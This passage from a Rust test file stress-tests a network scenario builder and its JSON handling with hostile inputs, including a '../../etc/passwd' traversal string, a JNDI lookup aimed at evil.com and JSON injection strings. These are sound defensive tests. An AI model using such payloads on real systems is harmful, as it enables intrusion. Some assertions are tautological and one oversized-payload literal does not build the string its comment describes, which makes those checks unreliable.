                }) = link_result
                {
                    assert_eq!(link_id, "test_link");
                    assert!(
                        from_node == from || to_node == to,
                        "Error should contain invalid endpoint"
                    );
                }
            }

            // Attack 2: Link ID injection attacks
            let malicious_link_ids = vec![
                "", // Empty link ID
                "../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "\x00\x01\u{00FF}\x7F",
                "link_with\nlines\rand\ttabs",
                "very_long_link_id_".repeat(1000),
                "unicode_link_🔒",
                r#"","malicious_field":"value"#,
                "duplicate_link", // Will be used for duplication test
            ];

            for malicious_id in malicious_link_ids {
                let link_result = base_builder.clone().add_link(
                    malicious_id.clone(),
                    "node1",
                    "node2",
                    LinkFaultConfig::default(),
                );

                match link_result {
                    Ok(updated_builder) => {
                        // Should preserve malicious link ID
                        let link = &updated_builder.links[0];
                        assert_eq!(link.id, malicious_id, "Link ID should be preserved");
                    }
                    Err(_) => {
                        // Some malicious IDs might fail validation
                    }
                }
            }

            // Attack 3: Duplicate link ID detection
            let duplicate_id = "duplicate_link";
            let mut link_builder = base_builder
                .clone()
                .add_link(duplicate_id, "node1", "node2", LinkFaultConfig::default())
                .expect("First link should be added successfully");

            // Try to add second link with same ID
            let duplicate_link_result =
                link_builder.add_link(duplicate_id, "node2", "node1", LinkFaultConfig::default());

            assert!(
                duplicate_link_result.is_err(),
                "Duplicate link ID should be rejected"
            );
            if let Err(ScenarioBuilderError::DuplicateLink { link_id }) = duplicate_link_result {
                assert_eq!(
                    link_id, duplicate_id,
                    "Error should contain duplicate link ID"
                );
            }

            // Attack 4: Self-referencing link attempts
            let self_link_result = base_builder.clone().add_link(
                "self_link",
                "node1",
                "node1", // Same node for both endpoints
                LinkFaultConfig::default(),
            );

            // Should either accept self-links or reject with appropriate error
            match self_link_result {
                Ok(updated_builder) => {
                    let link = &updated_builder.links[0];
                    assert_eq!(link.from, "node1");
                    assert_eq!(link.to, "node1");
                }
                Err(_) => {
                    // Self-links might be rejected by design
                }
            }

            // Attack 5: Link capacity stress testing
            let mut stress_builder = ScenarioBuilder::new("link_stress")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2");

            // Add many links to test capacity limits
            for i in 0..MAX_LINKS.saturating_add(5) {
                let link_result = stress_builder.add_link(
                    format!("link_{}", i),
                    "node1",
                    "node2",
                    LinkFaultConfig::default(),
                );

                match link_result {
                    Ok(updated_builder) => {
                        stress_builder = updated_builder;
                        if i < MAX_LINKS {
                            assert!(
                                stress_builder.links.len() <= MAX_LINKS,
                                "Links should be bounded"
                            );
                        }
                    }
                    Err(_) => {
                        // Capacity exceeded or other validation error
                        break;
                    }
                }
            }

            assert!(
                stress_builder.links.len() <= MAX_LINKS,
                "Final link count should be bounded"
            );
        }

        #[test]
        fn test_fault_profile_injection_and_configuration_attacks() {
            // Create base scenario with links
            let mut base_builder = ScenarioBuilder::new("fault_test")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2")
                .add_link("link1", "node1", "node2", LinkFaultConfig::default())
                .expect("Should add link1");

            // Attack 1: Fault profile name injection
            let malicious_profile_names = vec![
                "", // Empty profile name
                "../../etc/passwd",
                "${jndi:ldap://evil.com}",
                "\x00\x01\u{00FF}\x7F",
                "profile_with\nlines\rand\ttabs",
                "very_long_profile_name_".repeat(1000),
                "unicode_profile_🔒_⚡",
                r#"","injected_field":"value"#,
            ];

            for profile_name in malicious_profile_names {
                let fault_config = LinkFaultConfig::default();
                let profile_result = base_builder.clone().add_fault_profile(
                    profile_name.clone(),
                    "link1",
                    fault_config,
                );

                match profile_result {
                    Ok(updated_builder) => {
                        // Should preserve malicious profile name
                        assert!(
                            updated_builder.fault_profiles.contains_key(&profile_name),
                            "Fault profile should be stored with malicious name"
                        );
                    }
                    Err(_) => {
                        // Some malicious names might fail validation
                    }
                }
            }

            // Attack 2: Fault profile targeting nonexistent links
            let nonexistent_links = vec![
                "nonexistent_link",
                "",
                "../../etc/passwd",
                "link_that_does_not_exist",
                "\x00null_link",
            ];

            for link_name in nonexistent_links {
                let profile_result = base_builder.clone().add_fault_profile(
                    "test_profile",
                    link_name.clone(),
                    LinkFaultConfig::default(),
                );

                // Should fail with unknown link error
                assert!(
                    profile_result.is_err(),
                    "Fault profile targeting nonexistent link should fail"
                );

                if let Err(ScenarioBuilderError::UnknownFaultProfileLink {
                    profile_name,
                    link_id,
                }) = profile_result
                {
                    assert_eq!(profile_name, "test_profile");
                    assert_eq!(link_id, link_name);
                }
            }

            // Attack 3: Fault configuration boundary testing with extreme values
            let extreme_fault_configs = vec![
                LinkFaultConfig {
                    latency_ms: u64::MAX,
                    packet_loss_pct: 100.0,
                    jitter_ms: u64::MAX,
                    bandwidth_mbps: f64::MAX,
                    corruption_pct: 100.0,
                },
                LinkFaultConfig {
                    latency_ms: 0,
                    packet_loss_pct: 0.0,
                    jitter_ms: 0,
                    bandwidth_mbps: 0.0,
                    corruption_pct: 0.0,
                },
                LinkFaultConfig {
                    latency_ms: u64::MAX / 2,
                    packet_loss_pct: 50.0,
                    jitter_ms: u64::MAX / 2,
                    bandwidth_mbps: f64::MIN_POSITIVE,
                    corruption_pct: 50.0,
                },
            ];

            for (i, fault_config) in extreme_fault_configs.iter().enumerate() {
                let profile_result = base_builder.clone().add_fault_profile(
                    format!("extreme_profile_{}", i),
                    "link1",
                    fault_config.clone(),
                );

                if let Ok(updated_builder) = profile_result {
                    let stored_config = updated_builder
                        .fault_profiles
                        .get(&format!("extreme_profile_{}", i))
                        .expect("Profile should be stored");

                    // Values should be preserved even if extreme
                    assert_eq!(stored_config.latency_ms, fault_config.latency_ms);
                    assert_eq!(stored_config.packet_loss_pct, fault_config.packet_loss_pct);
                }
            }

            // Attack 4: Multiple fault profiles on same link
            let mut multi_profile_builder = base_builder.clone();

            for i in 0..100 {
                let profile_result = multi_profile_builder.add_fault_profile(
                    format!("profile_{}", i),
                    "link1",
                    LinkFaultConfig::default(),
                );

                if let Ok(updated_builder) = profile_result {
                    multi_profile_builder = updated_builder;
                } else {
                    break;
                }
            }

            // Should handle multiple profiles on same link
            assert!(
                !multi_profile_builder.fault_profiles.is_empty(),
                "Should store multiple fault profiles"
            );

            // Attack 5: Fault profile with NaN/Infinity values
            let nan_fault_config = LinkFaultConfig {
                latency_ms: 1000,
                packet_loss_pct: f64::NAN,
                jitter_ms: 500,
                bandwidth_mbps: f64::INFINITY,
                corruption_pct: f64::NEG_INFINITY,
            };

            let nan_result =
                base_builder
                    .clone()
                    .add_fault_profile("nan_profile", "link1", nan_fault_config);

            // Should handle NaN/Infinity values appropriately
            match nan_result {
                Ok(updated_builder) => {
                    let config = updated_builder.fault_profiles.get("nan_profile").unwrap();
                    // System should either reject NaN/Inf or handle them safely
                    assert!(
                        config.packet_loss_pct.is_nan() || config.packet_loss_pct.is_finite(),
                        "NaN values should be handled safely"
                    );
                }
                Err(_) => {
                    // Rejection of NaN/Infinity values is also acceptable
                }
            }
        }

        #[test]
        fn test_scenario_assertion_injection_and_validation_attacks() {
            // Create base scenario
            let mut base_builder = ScenarioBuilder::new("assertion_test")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2");

            // Attack 1: Assertion targeting nonexistent nodes
            let nonexistent_node_assertions = vec![
                ScenarioAssertion::MessageDelivered {
                    from: "nonexistent_node".to_string(),
                    to: "node1".to_string(),
                    message_type: "test".to_string(),
                },
                ScenarioAssertion::MessageDelivered {
                    from: "node1".to_string(),
                    to: "nonexistent_node".to_string(),
                    message_type: "test".to_string(),
                },
                ScenarioAssertion::NodeState {
                    node: "nonexistent_node".to_string(),
                    expected_state: "active".to_string(),
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "nonexistent_link".to_string(),
                    min_mbps: 100.0,
                },
            ];

            for assertion in nonexistent_node_assertions {
                let assertion_result = base_builder.clone().add_assertion(assertion.clone());

                match assertion_result {
                    Ok(updated_builder) => {
                        // Assertion was added - will be validated during build
                        assert!(!updated_builder.assertions.is_empty());
                    }
                    Err(ScenarioBuilderError::InvalidAssertionNode {
                        node_id,
                        assertion: _,
                    }) => {
                        // Expected error for nonexistent nodes
                        assert!(node_id.contains("nonexistent") || node_id.is_empty());
                    }
                    Err(_) => {
                        // Other validation errors are acceptable
                    }
                }
            }

            // Attack 2: Assertion with malicious string content
            let malicious_assertions = vec![
                ScenarioAssertion::MessageDelivered {
                    from: "node1".to_string(),
                    to: "node2".to_string(),
                    message_type: "../../etc/passwd".to_string(),
                },
                ScenarioAssertion::NodeState {
                    node: "node1".to_string(),
                    expected_state: "${jndi:ldap://evil.com}".to_string(),
                },
                ScenarioAssertion::MessageDelivered {
                    from: "node1".to_string(),
                    to: "node2".to_string(),
                    message_type: "\x00\x01\u{00FF}\x7F".to_string(),
                },
                ScenarioAssertion::NodeState {
                    node: "node1".to_string(),
                    expected_state: "state_with\nlines\rand\ttabs".to_string(),
                },
                ScenarioAssertion::MessageDelivered {
                    from: "node1".to_string(),
                    to: "node2".to_string(),
                    message_type: "very_long_message_type_".repeat(5000),
                },
                ScenarioAssertion::NodeState {
                    node: "node1".to_string(),
                    expected_state: "unicode_state_🔒_⚡_🦀".to_string(),
                },
            ];

            for assertion in malicious_assertions {
                let assertion_result = base_builder.clone().add_assertion(assertion.clone());

                if let Ok(updated_builder) = assertion_result {
                    // Should preserve malicious content in assertions
                    let stored_assertion = &updated_builder.assertions[0];
                    match (stored_assertion, &assertion) {
                        (
                            ScenarioAssertion::MessageDelivered {
                                message_type: stored_type,
                                ..
                            },
                            ScenarioAssertion::MessageDelivered {
                                message_type: original_type,
                                ..
                            },
                        ) => {
                            assert_eq!(
                                stored_type, original_type,
                                "Message type should be preserved"
                            );
                        }
                        (
                            ScenarioAssertion::NodeState {
                                expected_state: stored_state,
                                ..
                            },
                            ScenarioAssertion::NodeState {
                                expected_state: original_state,
                                ..
                            },
                        ) => {
                            assert_eq!(stored_state, original_state, "State should be preserved");
                        }
                        _ => {} // Other assertion types
                    }
                }
            }

            // Attack 3: Assertion capacity stress testing
            let mut assertion_builder = base_builder.clone();

            for i in 0..MAX_ASSERTIONS.saturating_add(10) {
                let assertion = ScenarioAssertion::NodeState {
                    node: "node1".to_string(),
                    expected_state: format!("state_{}", i),
                };

                let assertion_result = assertion_builder.add_assertion(assertion);

                match assertion_result {
                    Ok(updated_builder) => {
                        assertion_builder = updated_builder;
                        assert!(
                            assertion_builder.assertions.len() <= MAX_ASSERTIONS,
                            "Assertions should be bounded"
                        );
                    }
                    Err(_) => {
                        // Capacity exceeded
                        break;
                    }
                }
            }

            // Attack 4: Assertion with extreme numeric values
            let extreme_assertions = vec![
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: f64::MAX,
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: f64::MIN_POSITIVE,
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: 0.0,
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: -1.0, // Negative bandwidth
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: f64::NAN, // NaN bandwidth
                },
                ScenarioAssertion::LinkBandwidth {
                    link: "test_link".to_string(),
                    min_mbps: f64::INFINITY, // Infinite bandwidth
                },
            ];

            for assertion in extreme_assertions {
                let assertion_result = base_builder.clone().add_assertion(assertion.clone());

                if let Ok(updated_builder) = assertion_result {
                    let stored_assertion = &updated_builder.assertions[0];
                    if let ScenarioAssertion::LinkBandwidth { min_mbps, .. } = stored_assertion {
                        // Extreme values should be preserved or rejected gracefully
                        assert!(
                            min_mbps.is_finite() || min_mbps.is_infinite() || min_mbps.is_nan(),
                            "Numeric values should be handled safely"
                        );
                    }
                }
            }

            // Attack 5: Empty assertion collections
            let empty_assertion_build = base_builder.clone().build();

            if let Ok(scenario) = empty_assertion_build {
                // Should handle scenarios with no assertions
                assert_eq!(
                    scenario.assertions().len(),
                    0,
                    "Should handle empty assertions"
                );
                assert_eq!(scenario.nodes().len(), 2, "Should still have nodes");
            }
        }

        #[test]
        fn test_scenario_build_validation_bypass_and_corruption_attacks() {
            // Attack 1: Build with corrupted internal state
            let mut corrupted_builder = ScenarioBuilder::new("corrupted_test").seed(42);

            // Manually corrupt internal vectors (simulate memory corruption)
            corrupted_builder.nodes = vec![
                VirtualNode {
                    id: "node1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Verifier,
                },
                VirtualNode {
                    id: "".to_string(), // Empty ID
                    name: "Corrupted Node".to_string(),
                    role: NodeRole::Proposer,
                },
            ];

            let corrupted_build = corrupted_builder.build();
            // Should either succeed or fail with appropriate validation error
            match corrupted_build {
                Ok(scenario) => {
                    assert_eq!(scenario.nodes().len(), 2);
                }
                Err(_) => {
                    // Validation should catch corrupted state
                }
            }

            // Attack 2: Build with inconsistent link references
            let mut inconsistent_builder = ScenarioBuilder::new("inconsistent_test")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2");

            // Manually add link with invalid reference
            inconsistent_builder.links = vec![VirtualLink {
                id: "bad_link".to_string(),
                from: "nonexistent_node".to_string(),
                to: "node2".to_string(),
                fault_config: LinkFaultConfig::default(),
            }];

            let inconsistent_build = inconsistent_builder.build();
            assert!(
                inconsistent_build.is_err(),
                "Should fail with invalid link endpoint"
            );

            // Attack 3: Build with extreme collection sizes
            let mut extreme_builder = ScenarioBuilder::new("extreme_test").seed(42);

            // Add maximum number of nodes
            for i in 0..MAX_NODES {
                extreme_builder = extreme_builder
                    .add_node(
                        format!("node_{}", i),
                        format!("Node {}", i),
                        NodeRole::Verifier,
                    )
                    .expect("Should add node within limits");
            }

            let extreme_build = extreme_builder.build();
            if let Ok(scenario) = extreme_build {
                assert_eq!(scenario.nodes().len(), MAX_NODES);
            }

            // Attack 4: Build scenario with zero seed
            let zero_seed_result = ScenarioBuilder::new("zero_seed_test")
                .seed(0) // Invalid seed
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .and_then(|b| b.add_node("node2", "Node 2", NodeRole::Proposer))
                .and_then(|b| b.build());

            assert!(
                zero_seed_result.is_err(),
                "Zero seed should fail validation"
            );
            if let Err(ScenarioBuilderError::NoSeed) = zero_seed_result {
                // Expected error
            } else {
                panic!("Expected NoSeed error");
            }

            // Attack 5: Build with massive fault profile collections
            let mut fault_stress_builder = ScenarioBuilder::new("fault_stress")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2")
                .add_link("link1", "node1", "node2", LinkFaultConfig::default())
                .expect("Should add link1");

            // Add many fault profiles
            for i in 0..1000 {
                let fault_result = fault_stress_builder.add_fault_profile(
                    format!("profile_{}", i),
                    "link1",
                    LinkFaultConfig {
                        latency_ms: i as u64,
                        packet_loss_pct: (i % 100) as f64,
                        jitter_ms: i as u64 / 2,
                        bandwidth_mbps: 100.0 + (i % 1000) as f64,
                        corruption_pct: (i % 10) as f64,
                    },
                );

                if let Ok(updated_builder) = fault_result {
                    fault_stress_builder = updated_builder;
                } else {
                    break;
                }
            }

            let fault_stress_build = fault_stress_builder.build();
            if let Ok(scenario) = fault_stress_build {
                assert!(!scenario.name().is_empty());
                assert_eq!(scenario.nodes().len(), 2);
            }

            // Attack 6: Concurrent build attempts (simulation)
            let concurrent_builder = ScenarioBuilder::new("concurrent_test")
                .seed(42)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2");

            // Simulate multiple concurrent builds
            for i in 0..10 {
                let concurrent_build = concurrent_builder.clone().build();

                if let Ok(scenario) = concurrent_build {
                    assert_eq!(scenario.name(), "concurrent_test");
                    assert_eq!(scenario.seed(), 42);
                    assert_eq!(scenario.nodes().len(), 2);
                }
            }
        }

        #[test]
        fn test_json_serialization_security_and_corruption_attacks() {
            // Create a valid scenario for serialization testing
            let test_scenario = ScenarioBuilder::new("json_test")
                .description("Test scenario for JSON attacks")
                .seed(12345)
                .add_node("node1", "Node 1", NodeRole::Verifier)
                .expect("Should add node1")
                .add_node("node2", "Node 2", NodeRole::Proposer)
                .expect("Should add node2")
                .add_link("link1", "node1", "node2", LinkFaultConfig::default())
                .expect("Should add link1")
                .add_assertion(ScenarioAssertion::NodeState {
                    node: "node1".to_string(),
                    expected_state: "active".to_string(),
                })
                .expect("Should add assertion")
                .build()
                .expect("Should build scenario");

            // Attack 1: JSON serialization with malicious field injection
            let scenario_with_injection =
                ScenarioBuilder::new(r#"test","injected_field":"malicious_value"#)
                    .description(
                        r#"desc","evil":"payload","injected":true#)
                .seed(42)
                .add_node(r#"node","type":"evil"#,
                        r#"name","injection":"attempt"#,
                        NodeRole::Verifier,
                    )
                    .expect("Should add malicious node")
                    .add_node("node2", "Node 2", NodeRole::Proposer)
                    .expect("Should add node2")
                    .build()
                    .expect("Should build scenario with injections");

            // Serialize scenario with injection attempts
            match serde_json::to_string(&scenario_with_injection) {
                Ok(json_str) => {
                    // Malicious content should be properly escaped
                    assert!(
                        !json_str.contains(r#""injected_field":"malicious_value""#),
                        "JSON injection should be escaped"
                    );
                    assert!(
                        json_str.contains(r#"test\",\"injected_field"#)
                            || json_str.contains(r#"test\",\\"injected_field"#)
                            || json_str.contains("test")
                            || !json_str.contains("injected_field"),
                        "Malicious content should be escaped or sanitized"
                    );
                }
                Err(_) => {
                    // Serialization failure is also acceptable
                }
            }

            // Attack 2: JSON deserialization with malicious payloads
            let malicious_json_payloads = vec![
                r#"{"name":"test","extra_field":"injected"}"#, // Unknown field
                r#"{"name":"test","seed":"not_a_number"}"#,    // Wrong type
                r#"{"name":"test","seed":null}"#,              // Null value
                r#"{"name":null}"#,                            // Null name
                r#"{"nodes":"not_an_array"}"#,                 // Wrong collection type
                r#"{"name":"test","nodes":[{"id":"node1","role":"INVALID_ROLE"}]}"#, // Invalid enum
                r#"{}"#,                                       // Empty object
                r#"{"name":"test","seed":9999999999999999999999999999999999999999999999999}"#, // Number overflow
                r#"{"name":"test","description":"very_long_description_" + "x".repeat(1_000_000)}"#, // Huge string
            ];

            for malicious_json in malicious_json_payloads {
                let deserialize_result: Result<Scenario, _> = serde_json::from_str(malicious_json);

                // Most should fail gracefully
                match deserialize_result {
                    Ok(parsed_scenario) => {
                        // If parsing succeeded, verify basic structure integrity
                        assert!(
                            !parsed_scenario.name().is_empty() || malicious_json.contains("null")
                        );
                    }
                    Err(_) => {
                        // Deserialization failure is expected for malformed JSON
                    }
                }
            }

            // Attack 3: Deeply nested JSON structure attacks
            let deep_nested_json = r#"{
                "name": "deep_test",
                "seed": 42,
                "nested": {
                    "level1": {
                        "level2": {
                            "level3": {
                                "level4": {
                                    "level5": "deep_value"
                                }
                            }
                        }
                    }
                }
            }"#;

            // Should handle deep nesting without stack overflow
            let deep_result: Result<serde_json::Value, _> = serde_json::from_str(deep_nested_json);
            assert!(
                deep_result.is_ok() || deep_result.is_err(),
                "Should handle deep JSON without crashing"
            );

            // Attack 4: Large JSON payload stress testing
            let large_scenario_data = (0..10000)
                .map(|i| {
                    format!(
                        r#"{{"id":"node_{}","name":"Node {}","role":"Verifier"}}"#,
                        i, i
                    )
                })
                .collect::<Vec<_>>()
                .join(",");

            let large_json = format!(
                r#"{{"name":"large_test","seed":42,"nodes":[{}]}}"#,
                large_scenario_data
            );

            // Should handle large payloads without memory exhaustion
            let large_result: Result<serde_json::Value, _> = serde_json::from_str(&large_json);
            match large_result {
                Ok(value) => {
                    assert!(value.is_object(), "Large JSON should parse to object");
                }
                Err(_) => {
                    // Memory limits or parsing errors are acceptable
                }
            }

            // Attack 5: Unicode and encoding attacks in JSON
            let unicode_json = r#"{
                "name": "unicode_test_🦀_🔒_⚡",
                "description": "Test with\u0000null\u0001bytes\u007Fand\u0080extended",
                "seed": 42
            }"#;

            let unicode_result: Result<serde_json::Value, _> = serde_json::from_str(unicode_json);
            match unicode_result {
                Ok(value) => {
                    if let Some(name) = value.get("name").and_then(|v| v.as_str()) {
                        assert!(
                            name.contains("🦀") || name.contains("unicode"),
                            "Unicode should be preserved"
                        );
                    }
                }
                Err(_) => {
                    // Unicode parsing errors are also acceptable
                }
            }

            // Attack 6: Schema version manipulation attacks
            let schema_version_attacks = vec![
                r#"{"schema_version":"malicious-v1.0","name":"test","seed":42}"#,
                r#"{"schema_version":"../../etc/passwd","name":"test","seed":42}"#,
                r#"{"schema_version":"","name":"test","seed":42}"#,
                r#"{"schema_version":null,"name":"test","seed":42}"#,
                r#"{"schema_version":123,"name":"test","seed":42}"#, // Wrong type
            ];

            for schema_attack in schema_version_attacks {
                let schema_result: Result<serde_json::Value, _> =
                    serde_json::from_str(schema_attack);

                if let Ok(value) = schema_result {
                    // Malicious schema versions should be preserved but not executed
                    if let Some(schema) = value.get("schema_version") {
                        assert!(
                            schema.is_string() || schema.is_null() || schema.is_number(),
                            "Schema version should maintain type safety"
                        );
                    }
                }
            }
        }
    }
}
